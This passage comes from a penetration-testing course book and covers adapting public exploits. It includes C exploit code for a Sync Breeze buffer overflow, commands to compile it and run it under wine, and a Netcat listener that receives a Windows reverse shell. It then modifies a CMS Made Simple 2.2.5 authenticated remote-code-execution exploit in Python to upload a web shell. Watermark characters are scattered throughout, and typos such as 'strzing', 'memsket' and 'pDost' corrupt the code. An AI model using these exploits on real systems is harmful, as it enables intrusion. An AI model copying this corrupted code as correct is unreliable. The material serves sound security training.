int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) +
strlen(request_three);
char *content_length_string i= malloc(15);
sprintf(content_length_strzing, "%d", content_length);
int buffer_length = strlen(request_one) + strlen(content_length_string) +
initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) +
D
strlen(request_three);
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
SendRequest(buffer, strlen(buffer));
}
int main() {
EvilRequest();
return 0;
}
Listing 323 - Exploit code following the socket information, return address instruction, and payload changes
Let’s compile the exploit code using mingw-w64 to determine if it generates any errors.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 440
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
kali@kali:~/Desktop$ ls -lah
total 372K
drwxr-xr-x 2 kali kali 4.0K Feb 24 17:14 .
drwxr-xr-x 17 kali kali 4.0K Feb 24 15:42 ..
-rw-r--r-- 1 kali kali 4.7K Feb 24 15:46 42341.c
-rwxr-xr-x 1 kali kali 355K Feb 24 17:14 syncbreeze_exploit.exe
Listing 324 - Compiling the modified exploit code using mingw-64
C g
Now that we have an updated, clean-compiling exploit, we can test it out. We’ll return to Immuntiy
@
Debugger with Sync Breeze attached and press + , follow the JMP ESP address at
0x10090c83, and press to set a breakpoint on it.
y
k
s
o
n
i
z
D
Figure 224: Setting a breakpoint at our JMP ESP address
Once our breakpoint has been set in the debugger, we can let the application run normally and
attempt to execute our exploit from Kali.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 441
Made in Morocco
Penetration Testing with Kali Linux
Because this binary is cross-compiled to run on Windows, we cannot simply run it from our Kali
machine. To run this Windows binary, we’ll need to use wine,694 which is a compatibility layer used
for running Windows applications on several operating systems such as Linux, BSD, and macOS.
kali@kali:~/Desktop$ sudo wine syncbreeze_exploit.exe
[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
Listing 325 - Running the Windows exploit using wine
Surprisingly, we do not hit our breakpoint at all. Instead, the application crashes and the EIP
register seems to be overwritten by “0x9010090c”. y
k
s
o
n
i
z
D
Figure 225: EIP is overwritten by our return address instruction address misaligned by one byte
By analyzing both the value stored in EIP (0x9010090c) and the buffer sent to the target
application, we’ll notice that our offset to overwrite the return address on the stack seems to be
694 (WineHQ, 2022), https://www.winehq.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 442
Made in Morocco
Penetration Testing with Kali Linux
off by one byte. The wrong offset forces the CPU to POP a different return address from the stack
rather than the intended one (0x10090c83). We’ll examine this discrepancy in the next section.
14.1.5 Changing the Overflow Buffer
Let’s try to understand our offset misalignment. Reviewing the first part of our large padding
buffer of “A” characters, we’ll notice that it starts with a call to malloc695 with the size 780:
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
Listing 326 - Allocating memory for the initial buffer using malloc
This number should seem familiar. In the beginning of this Module, we noted that 780 is the
offset in bytes required to overwrite the return address on the stack and take control of the EIP
register.
y
The malloc function only allocates a block of memory based on the requested size. This buffer
needs to be properly initialized, which is done using the memsket696 function right after the call to
malloc.
s
memset(padding, 0x41, initial_buffer_size);
Listing 327 - Filling the initial buffer with “A” characters
o
Using memset will fill the memory allocation with a particular character, in our case “0x41”, the
hex representation of the “A” character in ASCII.
n
The next line of code in the exploit is particularly interesting. We find a call to memset, which sets
the last byte in the allocation to a NULL byte.
i
memset(padding + initial_buffezr_size - 1, 0x00, 1);
Listing 328 - Memset setting the last byte to a null-terminator to convert the buffer into a string
D
This may seem confusing at first; however, continuing to read the code, we arrive at the lines
where the final buffer is created.
char *buffer = malloc(buffer_length);
memset(buffer, 0x00, buffer_length);
strcpy(buffer, request_one);
strcat(buffer, content_length_string);
strcat(buffer, request_two);
strcat(buffer, padding);
strcat(buffer, retn);
strcat(buffer, shellcode);
strcat(buffer, request_three);
Listing 329 - Creating the final buffer for the exploit
The code starts by allocating a memory block for the buffer character array using malloc, then
filling the array with NULL bytes. Next, the code fills the buffer character array by copying the
695 (cplusplus, 2022), http://www.cplusplus.com/reference/cstdlib/malloc/
696 (cplusplus, 2022), http://www.cplusplus.com/reference/cstring/memset/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 443
Made in Morocco
Penetration Testing with Kali Linux
content of the other variables through various string manipulation functions such as strcpy697 and
strcat.698
Knowing the final buffer must be constructed as a string is very important. The C programming
language makes use of null-terminated strings,699 meaning that functions such as strcpy and
strcat determine the end and the size of a string by searching for the first occurrence of a NULL
byte in the target character array. Since the allocation size of our initial padding buffer is 780, by
setting the last byte to 0x00, we end up concatenating (strcat) a string of “A” ASCII characters
that is 779 bytes in length. This explains the misaligned overwrite of EIP.
We can quickly fix this misalignment by increasing the requested memory size defined by the
initial_buffer_size variable by 1.
int initial_buffer_size = 781;
char *padding = malloc(initial_buffer_size);
y
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
Listing 330 - Changing the padding allocatkion size
As a final test, we will again compile the code, set up a Netcat listener on port 443 to catch our
s
reverse shell, and, after making sure the Sync Breeze service is running on the target machine,
launch the exploit.
o
kali@kali:~/Desktop$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
kali@kali:~$ sudo nc -lvp 443 n
listening on [any] 443 ...
Listing 331 - Compiling the exploit and setting up a Netcat listener on port 443
i
Next, we will run the exploit: z
kali@kali:~/Desktop$ wine syncbreeze_exploit.exe
D
[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected
[>] Request sent
Listing 332 - Running the final version of the exploit
Finally, we’ll switch to our Netcat listener.
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49662
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
Listing 333 - Receiving a reverse shell on our Kali Linux machine
697 (cplusplus, 2022), http://www.cplusplus.com/reference/cstring/strcpy/
698 (cplusplus, 2022), http://www.cplusplus.com/reference/cstring/strcat/
699 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Null-terminated_string
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 444
Made in Morocco
Penetration Testing with Kali Linux
Excellent! We have a shell. In addition, this exploit no longer requires access to a Windows-based
attack platform in the field, since we can run it from Kali.
14.2 Fixing Web Exploits
This Learning Unit covers the following Learning Objectives:
• Fix web application exploits
• Troubleshoot common web application exploit issues
Web application vulnerabilities do not often result in memory corruption. Since they are not
affected by protections provided by the operating system such as DEP and ASLR, they are
significantly easier to re-purpose. However, as we’ve learned during previous Modules, web
application vulnerabilities can often lead to database information leaks or even full control of the
y
underlying system.
14.2.1 Considerations and Overview k
Even if we might not have to deal with hex-encoded payloads in web exploits, it is important to
s
properly read the code and understand what considerations must be taken in our editing process.
When modifying web exploits, there are several okey questions we generally need to ask while
approaching the code:
conn
• Does it initiate an HTTP or HTTPS nection?
• Does it access a specific web application path or route?
i
• Does the exploit leverage a pre-authentication vulnerability?
z
• If not, how does the exploit authenticate to the web application?
POD
• How are the GET or ST requests crafted to trigger and exploit the vulnerability? Is there
any HTTP method involved?
• Does it rely on default application settings (such as the web path of the application) that may
have been changed after installation?
• Will oddities such as self-signed certificates disrupt the exploit?
We must also remember that public web application exploits do not take into account additional
protections such as .htaccess700 files or Web Application Firewalls (WAF). This is mainly because
the exploit author cannot possibly know about all these protections during the development
process, making them out of scope.
14.2.2 Selecting the Vulnerability and Fixing the Code
Let’s consider the following scenario: during an assessment, we discover a Linux host with an
exposed apache2 server. After enumerating the web server, we discover an installation of CMS
700 (Mozilla, 2022), https://developer.mozilla.org/en-US/docs/Learn/Server-side/Apache_Configuration_htaccess
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 445
Made in Morocco
Penetration Testing with Kali Linux
Made Simple version 2.2.5 listening on TCP port 443 . This version appears to be vulnerable to
remote code execution with a public exploit available on Exploit-DB.701
Although this vulnerability is post-authentication, we discovered valid application credentials
(admin / HUYfaw763) on another machine during the enumeration process.
Our plan is to adapt the generic public exploit to our target, obtain remote code execution, and
ultimately upload a web shell that gives us control of the server.
As we inspect the code, we realize the base_url variable needs to be changed to match our
environment.
base_url = "http://192.168.1.10/cmsms/admin"
Listing 334 - base_url variable as defined in the original exploit
Let’s modify the IP address and the protocol to HTTPS to reflect our yDebian VM target:
base_url = "https://192.168.50.120/admin"
k
Listing 335 - base_url variable updated to match our case
We also notice that, while browsing the target website, we’re presented with a
s
SEC_ERROR_UNKNOWN_ISSUER702 error. This error indicates that the certificate on the remote
host cannot be validated. We’ll need to account for this in the exploit code.
o
Specifically, the exploit is using the requests Python library to communicate with the target. The
code makes three POST requests on lines 34, 55, and 80:
n
...
response = requests.post(uril, data=data, allow_redirects=False)
...
z
response = requests.post(url, data=data, files=txt, cookies=cookies)
...
response = requests.pDost(url, data=data, cookies=cookies, allow_redirects=False)
...
Listing 336 - All three post requests as defined in the original exploit
Moreover, the official documentation703 indicates that the SSL certificate will be ignored if we set
the verify parameter to “False”.
...
response = requests.post(url, data=data, allow_redirects=False, verify=False)
...
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
...
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False,
verify=False)
...
Listing 337 - Modified post requests to ignore SSL verification.
701 (OffSec, 2023), https://www.exploit-db.com/exploits/44976
702 (Mozilla, 2022), https://support.mozilla.org/en-US/kb/error-codes-secure-websites?as=u&utm_source=inproduct
703 (python-requests.org, 2022), https://requests.readthedocs.io/en/latest/user/advanced/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 446
Made in Morocco
Penetration Testing with Kali Linux
Finally, we also need to change the credentials used in the original exploit to match those found
during the enumeration process. These are defined in the username and password variables at
lines 15 and 16, respectively.
username = "admin"
password = "password"
Listing 338 - username and password variables as defined in the original exploit
We can easily replace these credentials.
username = "admin"
password = "HUYfaw763"
Listing 339 - username and password variables updated to match our scenario
In this case, we do not need to update the simple payload since it only executes system
commands passed in clear text within the GET request. y
After all edits are complete, the final exploit should appear as follows:
k
# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
# Date: 3rd of July, 2018 s
# Exploit Author: Mustafa Hasan (@strukt93)
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: http://www.cmsmadesimple.orgo/downloads/cmsms/
# Version: 2.2.5
# CVE: CVE-2018-1000094
n
import requests
import base64
i
base_url = "https://10.11.0.12z8/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
D
username = "admin"
password = "HUYfaw763"
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'